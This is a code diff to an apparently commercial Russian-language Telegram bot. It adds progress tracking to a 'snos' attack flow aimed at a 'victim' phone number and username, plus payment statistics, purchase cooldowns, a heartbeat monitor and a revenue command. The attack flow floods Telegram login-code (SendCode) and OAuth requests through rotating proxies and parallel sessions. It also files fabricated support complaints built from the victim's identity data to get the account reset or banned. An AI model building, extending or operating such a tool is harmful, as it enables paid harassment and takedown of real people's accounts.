@@ -2252,7 +2252,8 @@ async def _session_alive(session_path: Path, px: tuple | None = None) -> tuple[b
 
 
 async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple],
-                            attempts: int, offset: float, idx: int = 0) -> list[dict]:
+                            attempts: int, offset: float, idx: int = 0,
+                            progress: dict | None = None) -> list[dict]:
     """One session's SendCode series: fresh client + unique proxy per attempt,
     FloodWait honored per worker without blocking the other sessions."""
     rows = []
@@ -2269,6 +2270,10 @@ async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple]
         r = await snos_sendcode_one(session_path, phone, px)
         r["attempt"] = attempt + 1
         rows.append(r)
+        if progress is not None:
+            progress["sc_done"] = progress.get("sc_done", 0) + 1
+            if r.get("ok"):
+                progress["sc_ok"] = progress.get("sc_ok", 0) + 1
         # a FloodWait row must park THIS worker for its cooldown, others keep shooting
         m = re.search(r"flood\s+(\d+)s", str(r.get("status", "")))
         if m:
@@ -2281,7 +2286,7 @@ async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple]
 SNOS_ATTEMPTS_PER_SESSION = int(os.getenv("SNOS_ATTEMPTS_PER_SESSION") or "3")
 
 
-async def snos_flood_sendcode(phone: str) -> list[dict]:
+async def snos_flood_sendcode(phone: str, progress: dict | None = None) -> list[dict]:
     """SendCode flood — rationed attempts across live sessions.
 
     Sessions run IN PARALLEL; each shoots N attempts through its sticky
@@ -2298,7 +2303,10 @@ async def snos_flood_sendcode(phone: str) -> list[dict]:
         await asyncio.sleep(random.uniform(1.5, 3.0))
         return out
 
-    workers = [_snos_wave_worker(s, phone, proxies, SNOS_ATTEMPTS_PER_SESSION, i * 1.2, i)
+    if progress is not None:
+        progress["sc_total"] = len(sessions) * SNOS_ATTEMPTS_PER_SESSION
+    workers = [_snos_wave_worker(s, phone, proxies, SNOS_ATTEMPTS_PER_SESSION,
+                                 i * 1.2, i, progress)
                for i, s in enumerate(sessions)]
     waves = await asyncio.gather(*workers)
     out = [r for rows in waves for r in rows]
@@ -2394,7 +2402,7 @@ async def snos_ads_one(phone: str, px: tuple | None) -> dict:
                 "ok": False, "err": f"{type(e).__name__}"}
 
 
-async def snos_flood_oauth(phone: str) -> list[dict]:
+async def snos_flood_oauth(phone: str, progress: dict | None = None) -> list[dict]:
     proxies = load_pin_proxies()
     tasks = []
     for bot_id, origin in OAUTH_SERVICES:
@@ -2404,6 +2412,14 @@ async def snos_flood_oauth(phone: str) -> list[dict]:
         px = random.choice(proxies) if proxies else None
         tasks.append(snos_mytg_one(phone, px))
         tasks.append(snos_ads_one(phone, px))
+    if progress is not None:
+        progress["oa_total"] = len(tasks)
+
+        async def _oa_wrap(_t):
+            _r = await _t
+            progress["oa_done"] = progress.get("oa_done", 0) + 1
+            return _r
+        tasks = [_oa_wrap(_t) for _t in tasks]
     return await asyncio.gather(*tasks, return_exceptions=True)
 
 
@@ -2432,10 +2448,13 @@ async def snos_support_one(phone: str, text: str, subject: str,
         return False, f"{type(e).__name__}: {e}"
 
 
-async def snos_web_support(phone: str, username: str, victim_id: int) -> list[dict]:
+async def snos_web_support(phone: str, username: str, victim_id: int,
+                           progress: dict | None = None) -> list[dict]:
     """3 complaints to support carrying the victim's identity data."""
     proxies = load_pin_proxies()
     texts = random.sample(SNOS_SUPPORT_TEXTS, min(3, len(SNOS_SUPPORT_TEXTS)))
+    if progress is not None:
+        progress["sp_total"] = len(texts)
     subj_pool = list(SNOS_SUBJECTS)
     random.shuffle(subj_pool)
     out = []
@@ -2452,6 +2471,10 @@ async def snos_web_support(phone: str, username: str, victim_id: int) -> list[di
         ok, err = await snos_support_one(phone, full_text, subject, px)
         out.append({"name": f"support#{i}", "proxy": px[1] if px else "direct",
                     "ok": ok, "err": err})
+        if progress is not None:
+            progress["sp_done"] = progress.get("sp_done", 0) + 1
+            if ok:
+                progress["sp_ok"] = progress.get("sp_ok", 0) + 1
         await asyncio.sleep(random.uniform(1.5, 3.5))
     return out
 
@@ -2536,10 +2559,10 @@ async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
     data["victim"] = victim
 
     progress["step"] = "\U0001f4f2 2/4 SendCode флуд"
-    data["sendcode"] = await snos_flood_sendcode(phone)
+    data["sendcode"] = await snos_flood_sendcode(phone, progress)
 
     progress["step"] = "\U0001f310 3/4 OAuth флуд"
-    oauth_res = await snos_flood_oauth(phone)
+    oauth_res = await snos_flood_oauth(phone, progress)
     oauth_ok = []
     for o in oauth_res:
         if isinstance(o, dict):
@@ -2551,7 +2574,8 @@ async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
 
     if victim["ok"]:
         progress["step"] = "\U0001f4e8 4/4 Web support жалобы"
-        data["support"] = await snos_web_support(phone, username, victim["id"])
+        data["support"] = await snos_web_support(phone, username,
+                                                 victim["id"], progress)
     else:
         data["support"] = []
 
@@ -2577,6 +2601,37 @@ async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
 
     progress["done"] = True
     return data
+
+
+def _snos_bars(progress: dict) -> str:
+    """Live progress bars for the snos animation."""
+    def _bar(done: int, total: int) -> str:
+        if not total:
+            return ""
+        frac = max(0.0, min(1.0, done / total))
+        fill = int(round(frac * 8))
+        return "\u2593" * fill + "\u2591" * (8 - fill)
+
+    lines = []
+    sc_t = progress.get("sc_total", 0)
+    if sc_t:
+        sc_d = progress.get("sc_done", 0)
+        sc_ok = progress.get("sc_ok", 0)
+        lines.append(f"\U0001f4f2 SendCode {_bar(sc_d, sc_t)} {sc_d}/{sc_t}"
+                     + (f" \u2705{sc_ok}" if sc_ok else ""))
+    oa_t = progress.get("oa_total", 0)
+    if oa_t:
+        oa_d = progress.get("oa_done", 0)
+        lines.append(f"\U0001f310 OAuth {_bar(oa_d, oa_t)} {oa_d}/{oa_t}")
+    sp_t = progress.get("sp_total", 0)
+    if sp_t:
+        sp_d = progress.get("sp_done", 0)
+        sp_ok = progress.get("sp_ok", 0)
+        lines.append(f"\U0001f4e8 Support {_bar(sp_d, sp_t)} {sp_d}/{sp_t}"
+                     + (f" \u2705{sp_ok}" if sp_ok else ""))
+    if not lines:
+        return ""
+    return "\n".join(lines) + "\n"
 
 
 # ── snos: UI state bits ─────────────────────────────────
@@ -3940,6 +3995,7 @@ async def snos_run_confirm(cb: CallbackQuery, state: FSMContext):
             bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
             + "\n\n"
             + f"<b>{frame}</b> {html_mod.escape(progress.get('step', ''))}\n"
+            + _snos_bars(progress)
             + f"\U0001f3af @{html_mod.escape(username)}\n"
             + f"\U0001f4f1 <code>{phone}</code>\n"
             + f"\u23f1 {elapsed}s"
@@ -4579,6 +4635,11 @@ async def ct_fetch_balance() -> float | None:
 
 CT_SBP_API = "https://api.cloudtips.ru/api"
 CT_ACCRUAL_RATE = float(os.getenv("CT_ACCRUAL_RATE", "0.85"))
+_ct_buy_times: dict[int, float] = {}
+_ct_last_poll = 0.0
+_ct_last_ok = 0.0
+_BOT_STARTED = time.time()
+_ERR_EVENTS: list = []
 _SBP_HDRS = {
     "Content-Type": "application/json",
     "Origin": "https://pay.cloudtips.ru",
@@ -4659,6 +4720,7 @@ async def ct_activate(bot, uid: int, plan: str, amount: float,
             parse_mode=ParseMode.HTML)
     except Exception:
         pass
+    bump_pay_stats(uid, plan, "cloudtips", amount, "RUB")
     await push_send_log(
         "Оплата (Cloudtips, авто)",
         [f"✅ <code>{uid}</code> — план <b>{plan}</b>",
@@ -4667,7 +4729,8 @@ async def ct_activate(bot, uid: int, plan: str, amount: float,
 
 async def ct_poll_once(bot) -> None:
     """One poll: SBP status best-effort, balance delta as authority."""
-    global _last_balance
+    global _last_balance, _ct_last_poll, _ct_last_ok
+    _ct_last_poll = time.time()
     bal = await ct_fetch_balance()
     pend = load_ct_pending()
     if not pend:
@@ -4756,6 +4819,7 @@ async def ct_poll_once(bot) -> None:
         save_ct_pending(pend)
     if bal is not None:
         _last_balance = bal
+        _ct_last_ok = time.time()
 
 
 async def ct_poller_loop(bot) -> None:
@@ -4766,6 +4830,63 @@ async def ct_poller_loop(bot) -> None:
         except Exception as e:
             log.error("ct poller: %s", e)
         await asyncio.sleep(45)
+
+
+HB_INTERVAL = int(os.getenv("HB_INTERVAL") or "3600")
+
+
+class _ErrCounter(logging.Handler):
+    def emit(self, record):
+        try:
+            _ERR_EVENTS.append((time.time(), int(record.levelno)))
+        except Exception:
+            pass
+
+
+def _fmt_uptime(sec: float) -> str:
+    m = int(sec // 60)
+    return f"{m // 60}\u0447 {m % 60:02d}\u043c"
+
+
+async def hb_once(bot) -> None:
+    """Hourly health summary to the admin."""
+    if not ADMIN_ID:
+        return
+    now = time.time()
+    errs = sum(1 for ts, lvl in list(_ERR_EVENTS)
+               if now - ts < 3600 and lvl >= logging.ERROR)
+    while _ERR_EVENTS and now - _ERR_EVENTS[0][0] > 7200:
+        _ERR_EVENTS.pop(0)
+    pend = load_ct_pending()
+    staleness = now - _ct_last_poll if _ct_last_poll else -1
+    bal = await ct_fetch_balance()
+    bal_s = f"{bal:g}" if bal is not None else "н/д"
+    text = (bq(f"\U0001fa7a <b>{NAME}</b> \u2014 heartbeat")
+            + f"\n\u23f1 \u0410\u043f\u0442\u0430\u0439\u043c: <b>{_fmt_uptime(now - _BOT_STARTED)}</b>"
+            + f"\n\u274c \u041e\u0448\u0438\u0431\u043a\u0438 \u0437\u0430 \u0447\u0430\u0441: <b>{errs}</b>"
+            + f"\n\U0001f9fe Pending: <b>{len(pend)}</b>"
+            + f"\n\U0001f4b0 \u0411\u0430\u043b\u0430\u043d\u0441 Cloudtips: "
+            + f"<b>{bal_s}</b>"
+            + f"\n\U0001f504 \u041f\u043e\u043b\u043b\u0435\u0440: "
+            + ("<b>\u043e\u043a</b>" if staleness < 120
+               else f"<b>\u043c\u043e\u043b\u0447\u0438\u0442 {int(staleness // 60)} \u043c\u0438\u043d</b>"))
+    if pend and staleness > 900:
+        text += ("\n\n\u26a0\ufe0f \u041f\u043e\u043b\u043b\u0435\u0440 \u043d\u0435 \u0442\u0438\u043a\u0430\u0435\u0442 "
+                 "\u2014 \u043f\u043b\u0430\u0442\u0435\u0436\u0438 \u043d\u0435 \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u0443\u044e\u0442\u0441\u044f!")
+    if bal is None and pend:
+        text += ("\n\u26a0\ufe0f \u0411\u0430\u043b\u0430\u043d\u0441 \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d "
+                 "\u2014 \u043f\u0440\u043e\u0432\u0435\u0440\u044c \u0446\u0435\u043f\u043e\u0447\u043a\u0443 Cloudtips.")
+    await bot.send_message(int(ADMIN_ID), _cx(text), parse_mode=ParseMode.HTML)
+
+
+async def hb_loop(bot) -> None:
+    await asyncio.sleep(90)
+    while True:
+        try:
+            await hb_once(bot)
+        except Exception as e:
+            log.error("heartbeat: %s", e)
+        await asyncio.sleep(HB_INTERVAL)
 
 
 # ── beta payment methods (CryptoBot + Telegram Stars) ────
@@ -5199,6 +5320,31 @@ async def count_valid_refs_async(user_id: int) -> int:
     return good + credit
 
 
+PAY_STATS_FILE = Path(__file__).parent / "pay_stats.json"
+CUR_BY_METHOD = {"cloudtips": "\u20bd", "xrocket": "USDT", "stars": "\u2b50"}
+
+
+def load_pay_stats() -> list:
+    try:
+        return json.loads(PAY_STATS_FILE.read_text(encoding="utf-8"))
+    except Exception:
+        return []
+
+
+def save_pay_stats(recs: list) -> None:
+    PAY_STATS_FILE.write_text(
+        json.dumps(recs[-2000:], ensure_ascii=False), encoding="utf-8")
+
+
+def bump_pay_stats(uid: int, plan: str, method: str,
+                   amount: float, cur: str) -> None:
+    recs = load_pay_stats()
+    recs.append({"ts": time.time(), "uid": uid, "plan": plan,
+                 "method": method, "amount": round(amount, 2), "cur": cur})
+    save_pay_stats(recs)
+    commit_file_to_repo("pay_stats.json", "pay stats update", cooldown=600)
+
+
 def sub_quality(subs: dict, user_id: int) -> tuple[str, str]:
     """(state, until_str). state: admin|forever|active|free|expired"""
     if user_is_admin(user_id):
@@ -5366,6 +5512,18 @@ async def sub_buy(cb: CallbackQuery, state: FSMContext):
             await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
             return
         uid = cb.from_user.id
+        # anti-abuse: one open invoice per user + purchase cooldown
+        _pend_chk = load_ct_pending()
+        if str(uid) in _pend_chk:
+            await cb.answer("У тебя уже висит неоплаченный счёт — "
+                            "оплати или жми «Я оплатил».", show_alert=True)
+            return
+        _ago = time.time() - _ct_buy_times.get(uid, 0)
+        if _ago < 60:
+            await cb.answer(f"Слишком часто — подожди {int(60 - _ago)} сек.",
+                            show_alert=True)
+            return
+        _ct_buy_times[uid] = time.time()
         amount = ct_amount(uid, pk)
         pay_url = f"{CLOUDTIPS_PAGE}?amount={amount}"
         try:
@@ -5542,6 +5700,53 @@ async def sub_ct_paid(cb: CallbackQuery, state: FSMContext):
                     show_alert=True)
 
 
+@router.message(Command("stats"))
+async def cmd_stats(msg: Message):
+    """Admin: revenue by method, payers, conversion, active subs."""
+    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
+        return
+    recs = load_pay_stats()
+    now = time.time()
+
+    def _rev(window: float):
+        rows = [r for r in recs if now - r.get("ts", 0) < window]
+        out = {}
+        for r in rows:
+            m = r.get("method", "?")
+            amt, cnt = out.get(m, (0.0, 0))
+            out[m] = (amt + float(r.get("amount", 0)), cnt + 1)
+        return out, len(rows)
+
+    d24, n24 = _rev(86400)
+    d7, n7 = _rev(7 * 86400)
+    dall, nall = _rev(10 ** 9)
+
+    def _fmt(d: dict) -> str:
+        if not d:
+            return "\u2014"
+        return " | ".join(
+            f"{k}: {v[0]:g} {CUR_BY_METHOD.get(k, '')} \u00d7{v[1]}"
+            for k, v in sorted(d.items()))
+
+    subs = load_subs()
+    active = sum(1 for v in subs.values()
+                 if v.get("forever") or v.get("until", 0) > now)
+    users = load_users()
+    payers = len({r.get("uid") for r in recs})
+    conv = (payers / len(users) * 100) if users else 0
+    text = (bq(f"\U0001f4ca <b>{NAME}</b> \u2014 \u043c\u0435\u0442\u0440\u0438\u043a\u0438")
+            + "\n\n<b>24\u0447</b>: " + _fmt(d24)
+            + f" (\u043f\u043b\u0430\u0442\u0435\u0436\u0435\u0439 {n24})"
+            + "\n<b>7\u0434</b>: " + _fmt(d7)
+            + f" (\u043f\u043b\u0430\u0442\u0435\u0436\u0435\u0439 {n7})"
+            + "\n<b>\u0432\u0441\u0451 \u0432\u0440\u0435\u043c\u044f</b>: " + _fmt(dall)
+            + f" (\u043f\u043b\u0430\u0442\u0435\u0436\u0435\u0439 {nall})"
+            + f"\n\n\U0001f464 \u042e\u0437\u0435\u0440\u043e\u0432: <b>{len(users)}</b>"
+            + f" | \u041f\u043b\u0430\u0442\u0438\u043b\u0438: <b>{payers}</b> ({conv:.1f}%)"
+            + f" | \u0410\u043a\u0442\u0438\u0432\u043d\u044b\u0445 \u043f\u043e\u0434\u043f\u0438\u0441\u043e\u043a: <b>{active}</b>")
+    await msg.answer(_cx(text), parse_mode=ParseMode.HTML)
+
+
 @router.callback_query(F.data.startswith("sub:ctok:"))
 async def sub_ct_ok(cb: CallbackQuery, state: FSMContext):
     """Admin approves cloudtips payment → activate plan."""
@@ -5556,6 +5761,8 @@ async def sub_ct_ok(cb: CallbackQuery, state: FSMContext):
     subs = load_subs()
     activate_plan(subs, uid, pk)
     pend = load_ct_pending()
+    _rec_amt = float((pend.get(str(uid)) or {}).get("amount", 0))
+    bump_pay_stats(uid, pk, "cloudtips", _rec_amt, "RUB")
     pend.pop(str(uid), None)
     save_ct_pending(pend)
     s, until = sub_quality(subs, uid)
@@ -5656,6 +5863,8 @@ async def on_successful_payment(msg: Message):
     if pk in SUB_PLANS:
         subs = load_subs()
         activate_plan(subs, uid, pk)
+        bump_pay_stats(uid, pk, "stars",
+                       float(sp.total_amount or 0), "XTR")
     try:
         s, until = sub_quality(subs, uid)
         await msg.answer(
@@ -5703,6 +5912,9 @@ async def sub_check(cb: CallbackQuery, state: FSMContext):
         if status in ("paid", "confirmed", "success", "completed"):
             if plan_key and SUB_PLANS.get(plan_key):
                 activate_plan(subs, pay_user, plan_key)
+                bump_pay_stats(pay_user, plan_key, "xrocket",
+                               float(SUB_PLANS[plan_key].get("price", 0)),
+                               "USDT")
             await cb.answer("\u2705 \u041e\u043f\u043b\u0430\u0442\u0430 \u043f\u0440\u043e\u0448\u043b\u0430, \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u0430\u043a\u0442\u0438\u0432\u043d\u0430!", show_alert=True)
             s, until = sub_quality(subs, info["user"])
             caption = (
@@ -6001,7 +6213,8 @@ async def main():
         log.warning("mirror submodule unavailable: %s", e)
 
     # retry the whole polling loop on network hiccups
-    global _BOT
+    global _BOT, _BOT_STARTED
+    _BOT_STARTED = time.time()
     while True:
         bot = Bot(token=BOT_TOKEN)
         _BOT = bot
@@ -6012,6 +6225,10 @@ async def main():
             if not globals().get("_ct_poller_started"):
                 globals()["_ct_poller_started"] = True
                 asyncio.create_task(ct_poller_loop(bot))
+            if not globals().get("_hb_started"):
+                globals()["_hb_started"] = True
+                logging.getLogger().addHandler(_ErrCounter())
+                asyncio.create_task(hb_loop(bot))
             await dp.start_polling(bot)
             break
         except TelegramNetworkError as e:
